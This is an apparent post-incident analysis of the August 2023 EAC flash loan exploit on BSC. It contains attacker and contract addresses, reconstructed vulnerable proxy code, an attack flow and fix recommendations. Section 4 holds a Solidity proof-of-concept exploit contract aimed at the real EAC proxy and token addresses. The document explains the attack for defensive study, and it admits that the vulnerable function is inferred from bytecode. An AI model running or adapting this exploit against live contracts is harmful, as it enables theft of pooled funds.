# EAC Flash Loan Proxy Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | EAC |
| Date | 2023-08-16 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~29 BNB |
| Attack Type | Flash Loan + Proxy Call Exploit |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x27e981348c2d1f5b2227c182a9d0ed46eed84946` |
| Attack Contract | `0x20dcf125f0563417d257b98a116c3fea4f0b2db2` |
| Vulnerable Contract | `0xa08a40e0F11090Dcb09967973DF82040bFf63561` (EAC Proxy) |
| EAC Token | `0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E` |
| Fork Block | 31,273,018 |

## 2. Vulnerability Code Analysis

The EAC proxy contract contained a vulnerable function corresponding to selector `0xe6a24c3f`. This function could modify EAC token state or manipulate internal accounting without any caller validation. The attacker obtained USDT via a DODO flash loan, purchased EAC, then called the proxy's vulnerable function to inflate the EAC value before selling it for profit.

```solidity
// Vulnerable pattern: proxy function with no access control
contract EACProxy {
    address public implementation;

    // Vulnerable: function that modifies internal state has no access control
    // Selector 0xe6a24c3f
    function manipulateState(/* params */) external {
        // No access control — callable by anyone
        // Can manipulate EAC token internal accounting
        _updateTokenReserves();
    }

    // delegatecall in fallback function
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

**Vulnerability**: A specific function (`0xe6a24c3f`) in the EAC proxy contract could modify EAC token internal state without any access control. After obtaining large amounts of USDT via a DODO flash loan, the attacker purchased EAC, manipulated the EAC value through this function, and swapped back into USDT for a profit of ~29 BNB.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Proxy Call Exploit
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0x27e981348c2d1f5b2227c182a9d0ed46eed84946]
  │
  ├─1─▶ IDPPOracle(dodo_pool).flashLoan()
  │      [DODO Pool: BSC USDT Pool]
  │      Borrow large amount of USDT
  │      [USDT: 0x55d398326f99059fF775485246999027B3197955]
  │
  ├─2─▶ swap(usdt, eac, balance)
  │      Swap USDT → EAC
  │      [EAC: 0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E]
  │
  ├─3─▶ proxy.call(0xe6a24c3f)
  │      [EAC Proxy: 0xa08a40e0F11090Dcb09967973DF82040bFf63561]
  │      Call vulnerable function — no access control
  │      Manipulate EAC internal state → inflate value
  │
  ├─4─▶ swap(eac, usdt, balance)
  │      Swap EAC back to USDT at inflated value
  │      → Receive more USDT than initially deposited
  │
  └─5─▶ IERC20(usdt).transfer() - Repay flash loan
         Realize ~29 BNB profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IDPPOracle {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

interface IEACProxy {
    function manipulateState() external; // 0xe6a24c3f
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

contract EACExploit {
    IDPPOracle dodoPool;
    IEACProxy eacProxy = IEACProxy(0xa08a40e0F11090Dcb09967973DF82040bFf63561);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 EAC = IERC20(0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E);
    IUniswapV2Router router;

    function testExploit() external {
        // Initiate DODO flash loan
        dodoPool.flashLoan(0, USDT.balanceOf(address(dodoPool)) * 99 / 100, address(this), "eac");
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata) external {
        // Swap USDT → EAC
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(USDT);
        buyPath[1] = address(EAC);
        USDT.approve(address(router), quoteAmount);
        router.swapExactTokensForTokens(quoteAmount, 0, buyPath, address(this), block.timestamp);

        // Call proxy vulnerable function — no access control
        (bool success,) = address(eacProxy).call(abi.encodeWithSelector(0xe6a24c3f));
        require(success, "Proxy call failed");

        // Swap EAC back to USDT at inflated value
        uint256 eacBalance = EAC.balanceOf(address(this));
        EAC.approve(address(router), eacBalance);
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(EAC);
        sellPath[1] = address(USDT);
        router.swapExactTokensForTokens(eacBalance, 0, sellPath, address(this), block.timestamp);

        // Repay flash loan
        USDT.transfer(address(dodoPool), quoteAmount);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Proxy function missing access control, internal state manipulation |
| Impact Scope | EAC token liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/address/0xa08a40e0F11090Dcb09967973DF82040bFf63561) |

## 6. Security Recommendations

```solidity
// Fix 1: Add access control to the vulnerable function
contract EACProxy {
    address public owner;
    mapping(address => bool) public authorizedCallers;

    modifier onlyAuthorized() {
        require(authorizedCallers[msg.sender] || msg.sender == owner, "Not authorized");
        _;
    }

    // Require authorization for functions that modify internal state
    function updateTokenReserves() external onlyAuthorized {
        _updateTokenReserves();
    }
}

// Fix 2: Harden the proxy pattern security
contract EACProxy {
    // Protect initializer function
    bool private initialized;

    function initialize(address _impl) external {
        require(!initialized, "Already initialized");
        initialized = true;
        implementation = _impl;
    }

    // Handle only admin functions at the proxy level
    mapping(bytes4 => bool) public restrictedSelectors;

    fallback() external payable {
        bytes4 selector = bytes4(msg.data[:4]);
        require(!restrictedSelectors[selector] || msg.sender == owner, "Restricted");
        // delegatecall...
    }
}

// Fix 3: Prevent same-block buy-and-sell
mapping(address => uint256) public lastBuyBlock;

function transfer(address to, uint256 amount) external override returns (bool) {
    if (isAMM[to]) {
        // Tokens purchased in the same block cannot be sold
        require(block.number > lastBuyBlock[msg.sender], "Same block buy-sell not allowed");
    }
    return super.transfer(to, amount);
}
```

## 7. Lessons Learned

1. **Audit proxy functions**: In upgradeable proxy patterns, all externally callable functions — especially those that modify internal state — must have explicit access controls.
2. **Selector-based attacks**: Low-level attacks that call directly via a function selector (`0xe6a24c3f`) may not be visible through high-level interfaces. Every function entry point must be audited.
3. **DODO DPP Oracle pattern**: On BSC, the combination of DODO DPP Oracle flash loans with vulnerabilities in smaller projects is a recurring attack pattern. BSC projects should pay particular attention to this vector.
4. **State manipulation within flash loans**: Calling state-modifying functions inside a flash loan callback produces an effect similar to reentrancy. Logic to prevent state-modifying functions from being called within a flash loan context is necessary.